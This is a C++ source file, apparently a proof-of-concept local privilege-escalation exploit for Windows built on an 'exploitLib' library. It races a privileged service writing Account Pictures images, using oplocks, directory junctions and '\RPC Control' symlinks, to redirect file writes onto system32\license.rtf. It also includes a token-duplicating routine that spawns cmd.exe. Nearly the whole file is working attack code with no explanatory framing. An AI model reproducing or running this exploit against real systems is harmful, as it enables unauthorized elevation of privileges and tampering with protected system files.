
#ifdef pic

#include <iostream>
#include "resource.h" 
#include <exploitLib/exploitLib.h>
#include "com.h"
#include "exploitLib/primitives.h" 
#include "misc.h"
#include "exploitLib/IPC/WER.h"
#include "exploitLib/IPC/datasharingservice.h"

#include "exploitLib/IPC/misc.h"
#include "exploitLib/misc.h"

using namespace x::literalNS;
 
static std::vector<x::symlink> links;

static auto targetFile = "\\??\\%WINDIR%\\system32\\license.rtf"_p;

void makeLinks(std::wstring filename)
{
   static auto firstFilename = filename;
   auto justguid = firstFilename.substr(0, (filename.find_last_of(L'}')) + 1);
   justguid[0] = '{';
   for (auto& index : { L"192", L"40",L"448",L"32" ,L"48",L"240",L"96" })
   {
      try
      {
         auto jpgname = justguid + L"-Image"s + index + L".jpg"s;
         auto tmpname = justguid + L"-Image"s + index + L".tmp"s;
         links.emplace_back(L"\\RPC Control\\"s + jpgname, "\\??\\%windir%\\temp"_p / jpgname);
         links.emplace_back(L"\\RPC Control\\"s + tmpname, "\\??\\%windir%\\temp"_p / tmpname);
         tmpname[0] = L'~';
         links.emplace_back(L"\\RPC Control\\"s + tmpname, targetFile );
      }
      catch (...) {}
   }
}



bool spawnShell()
{
   STARTUPINFO startInfo = { 0x00 };
   startInfo.cb = sizeof(startInfo);
   startInfo.wShowWindow = SW_SHOW;
   startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

   PROCESS_INFORMATION procInfo = { 0x00 };

   HANDLE hToken = {};
   DWORD  sessionId = WTSGetActiveConsoleSessionId();

   OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
   DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);

   SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId));

   if (CreateProcessAsUser(hToken,
      (L"c:\\windows\\system32\\cmd.exe"s).c_str(),
      const_cast<wchar_t*>(L"/c c:\\grepdump\\runalltasks.bat"),
      nullptr,
      nullptr,
      FALSE,
      NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
      nullptr,
      nullptr,
      &startInfo,
      &procInfo
   )
      ) {
      CloseHandle(procInfo.hProcess);
      CloseHandle(procInfo.hThread);
   }

   return true;
}
 
#include <exploitLib/exploitLib.h>

struct junc
{
   static const inline x::file rootdir{
                     "%TEMP%\\experiment"_p ,
                     FILE_WRITE_ATTRIBUTES | FILE_GENERIC_READ,
                     FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT ,
                     FILE_OPEN_IF
   };
   x::file  originDir{ 
                     x::strpath{rootdir} / (L"Origin"s + x::strpath{ x::guid::random_guid() }),
                     FILE_WRITE_ATTRIBUTES|FILE_GENERIC_READ,
                     FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT ,
                     FILE_CREATE 
                     };

   x::file  destinationDir;

   template < typename T = x::strpath >
   junc(T destination = (x::strpath{ rootdir } / ( L"destination"s + x::strpath{ x::guid::random_guid() } ) )) : destinationDir{
                                                                        destination, 
                                                                        FILE_WRITE_ATTRIBUTES,
                                                                        FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT ,
                                                                        FILE_CREATE 
                                                                     }
   {

      x::file tFile{ x::strpath{ originDir } / "wtf"_p, FILE_READ_ATTRIBUTES };

      x::file{ x::strpath{ destinationDir } / "wtf"_p, DELETE }.makeoplock(
         std::function< bool(x::ack<x::file>) >{
            [&](x::ack<x::file> file)
            {
               file.t.rename( "%TEMP%"_p / x::strpath{ x::guid::random_guid() } );
               destinationDir.makeJunction( originDir);
               return false;
            }
         }
      );

      for( auto& f : originDir.enumDir() )
      {
         auto destination = x::strpath{ destinationDir } / x::strpath{ f };
         auto source = x::strpath{ originDir } / x::strpath{ f };

         std::wcout << "rename before path: " << source << std::endl;

         auto sourceFile = x::file{ source, DELETE };
         sourceFile.rename(destination);
         std::wcout << "rename after path: " << sourceFile.getFinalPath() << std::endl;
      } 
   }
   operator x::strpath() { return originDir.getFinalPath(); }
 };

void clearFolder()
{
   for (auto& f : x::file{ "%TEMP%\\experiment"_p }.enumDir())
   {
      {
         auto cf = x::file{ "%TEMP%\\experiment"_p / f ,DELETE | FILE_WRITE_ATTRIBUTES ,FILE_OPEN_REPARSE_POINT,FILE_OPEN };
         try { cf.delete_reparse_point(); } catch (...) {};
      }
      for (auto& fa : x::file{ "%TEMP%\\experiment"_p / f }.enumDir())
      {
         x::file{ "%TEMP%\\experiment"_p / f / fa , DELETE ,0,FILE_OPEN }.deleteFile();
      }
      x::file{ "%TEMP%\\experiment"_p / f ,DELETE ,FILE_OPEN_REPARSE_POINT,FILE_OPEN }.deleteFile();
   }
}


int main(int, char* args[])
try
{
  
   LoadLibrary(L"netmsg.dll");

   THROW_LAST_ERROR_IF(!SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS));
 
   //Recreate the fakedir
   x::file oldfakedir{ "%public%\\AccountPictures"_p / x::getCurrentUserSidString()  , DELETE , FILE_OPEN_REPARSE_POINT  ,FILE_OPEN_IF };
   oldfakedir.rename("\\??\\%TEMP%"_p / x::guid::random_guid());

   static x::file fakedir{ "%public%\\AccountPictures"_p / x::getCurrentUserSidString() ,
      FILE_WRITE_ATTRIBUTES ,
      FILE_OPEN_REPARSE_POINT | FILE_DIRECTORY_FILE ,
      FILE_OPEN_IF
   };

   auto knownPathPart = "%public%\\AccountPictures"_p / x::getCurrentUserSidString();
   auto knownPathPartStr = knownPathPart.asWideString() + L"\\"s;

   auto targetwatch = x::file{ targetFile , FILE_READ_ATTRIBUTES };

   wil::unique_folder_change_reader mon;

   targetwatch.makeoplock(std::function< bool(x::ack<x::file>) >{
      [&](x::ack<x::file> file)
      {
         fakedir.delete_reparse_point();
         x::signals::signal(L"Finished").signalPulse();
         return false;
      }
   });

   std::vector< std::thread > threads;
   threads.resize(std::thread::hardware_concurrency());

   std::wstring jpgname;
   for (int tc = 0; tc <= std::thread::hardware_concurrency(); tc++)
   {
      threads.emplace_back(
         [&]()
         {
            static volatile bool openSuccess = false;
            SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
            x::signals::signal(L"startThreads").waitForSignal();;

            while (openSuccess != true)
            {
               try 
               {
                  x::file oplockFile{
                     ::NT::objattr{fakedir.getHandle(),x::unistr{ jpgname } } ,
                     FILE_READ_ATTRIBUTES | DELETE ,
                     FILE_OPEN_REQUIRING_OPLOCK,
                     FILE_OPEN_IF,
                     FILE_SHARE_READ | FILE_SHARE_WRITE
                  };

                  openSuccess = true;

                  oplockFile.makeoplock(
                     std::function< bool(x::ack<x::file>) >
                     {
                        [=](x::ack<x::file> file)
                        {
                           file.t.rename("\\??\\%WINDIR%\\temp"_p / x::guid::random_guid());
                           for (auto& f : fakedir.enumDir())
                           {
                              x::file{ x::strpath{knownPathPartStr + f }, DELETE }.rename("\\??\\%WINDIR%\\temp"_p / x::guid::random_guid());
                           }
                           fakedir.makeJunction("\\RPC Control");
                           makeLinks(jpgname);
                           return false;
                        }
                     }
                  );
               }
               catch (wil::ResultException & e)
               {
                  if (e.GetErrorCode() == 0xd0000909)
                  {
                     ULONG suspendCount = 0;
                     NtSuspendThread(GetCurrentThread(), &suspendCount);
                  }
                  else if (e.GetErrorCode() == 0xd0000043) {//STATUS_SHARING_VIOLATION
                  }
                  else {
                     std::wcout << e.what() << std::endl;
                  }
               }
            }
         }
      );
   }
   mon = fakedir.monitorFolderChanges(
      false,
      wil::FolderChangeEvents::All,
      [&](wil::FolderChangeEvent e, PCWSTR f)
      {
         std::wstring filename(f);
         auto justguid = filename.substr(0, (filename.find_last_of(L'}')) + 1);
         justguid[0] = '~';
         jpgname =  justguid + L"-Image96.tmp";
         x::signals::signal(L"startThreads").signalPulse();
      }
   );

   x::signals::signal( L"Finished" ).waitForSignal(); 

   std::for_each(threads.begin(), threads.end(), [](std::thread& t) {
      NtResumeThread(t.native_handle(), 0);
      if (t.joinable())
         t.join();
      }
   );
   return 0;
}
catch (wil::ResultException & e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
} 

#endif